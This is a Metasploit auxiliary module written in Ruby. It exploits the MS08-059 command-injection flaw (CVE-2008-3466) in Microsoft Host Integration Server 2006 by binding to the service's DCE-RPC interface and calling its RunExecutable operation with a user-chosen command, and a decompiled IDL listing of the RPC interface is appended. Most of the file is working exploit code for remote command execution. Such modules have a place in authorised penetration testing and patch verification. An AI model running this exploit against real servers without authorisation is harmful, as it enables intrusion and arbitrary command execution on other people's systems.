##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::DCERPC

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Host Integration Server 2006 Command Execution Vulnerability',
			'Description'    => %q{
					This module exploits a command-injection vulnerability in Microsoft Host Integration Server 2006.
			},
			'DefaultOptions' =>
				{
					'DCERPC::ReadTimeout' => 300 # Long-running RPC calls
				},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'MSB', 'MS08-059' ],
					[ 'CVE', '2008-3466' ],
					[ 'OSVDB', '49068' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=745' ],
				],
			'DisclosureDate' => 'Oct 14 2008'))

			register_options(
				[
				Opt::RPORT(0),
				OptString.new('COMMAND', [ true, 'The command to execute', 'cmd.exe']),
				OptString.new('ARGS', [ true, 'The arguments to the command', '/c echo metasploit > metasploit.txt'])
				], self.class )
	end

	def run

		dport = datastore['RPORT'].to_i

		if (dport != 0)
			print_status("Could not use automatic target when the remote port is given");
			return
		end

		if (dport == 0)

			dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp')
			dport ||= dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.1', 'ncacn_ip_tcp')

			if (not dport)
				print_status("Could not determine the RPC port used by the Service.")
				return
			end

				print_status("Discovered Host Integration Server RPC service on port #{dport}")
		end

		connect(true, { 'RPORT' => dport })

		dcerpc_handle('ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")

		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		cmd =  NDR.string("#{datastore['COMMAND']}") + NDR.string("#{datastore['ARGS']}")

		print_status("Sending command: #{datastore['COMMAND']} #{datastore['ARGS']}")

			begin
				dcerpc_call(0x01, cmd)
				rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			end

		disconnect

	end
end

=begin
/*
 * IDL code generated by mIDA v1.0.8
 * Copyright (C) 2006, Tenable Network Security
 * http://cgi.tenablesecurity.com/tenable/mida.php
 *
 *
 * Decompilation information:
 * RPC stub type: inline
 */

[
 uuid(ed6ee250-e0d1-11cf-925a-00aa00c006c1),
 version(1.1)
]

interface mIDA_interface
{

unknown _SnaRpcService_PingServer (
);


/* opcode: 0x01, address: 0x01002CBB */

small   _SnaRpcService_RunExecutable (
 [in][string] char arg_1,
 [in][string] char arg_2
);

/* opcode: 0x02, address: 0x01002F0B */

long   _SnaRpcService_CallRemoteDll (
 [in] long  arg_1,
 [in][size_is(arg_1)] byte arg_2[],
 [in] long  arg_3,
 [in][size_is(arg_1)] byte arg_4[]
);

unknown _SnaRpcService_GetInstalledDrives (
);

unknown _SnaRpcService_ServiceTableUpdate (
);


/* opcode: 0x05, address: 0x0100363C */

long   _SnaRpcService_GetWindowsVersion (
 [in] long  arg_1,
 [in, out][size_is(arg_1)] byte arg_2[]
);


/* opcode: 0x06, address: 0x01003942 */

small   _SnaRpcService_RunExecutableEx (
 [in][string] char arg_1,
 [in][string] char arg_2,
 [in][string] char arg_3
);


/* opcode: 0x07, address: 0x01003BAB */

long   _SnaRpcService_GetDLCMediaType (
 [in][string] char arg_1,
 [out][ref] long * arg_2
);


/* opcode: 0x08, address: 0x01003E29 */

small   _SnaRpcService_UserHasAccess (
 [in] long  arg_1
);


/* opcode: 0x09, address: 0x01004061 */

small   _SnaRpcService_ConfigureHisService (
 [in][string] char arg_1
);


/* opcode: 0x0A, address: 0x01004272 */

small   _SnaRpcService_ConfigureServiceAccount (
 [in][string] char arg_1
);

}
=end
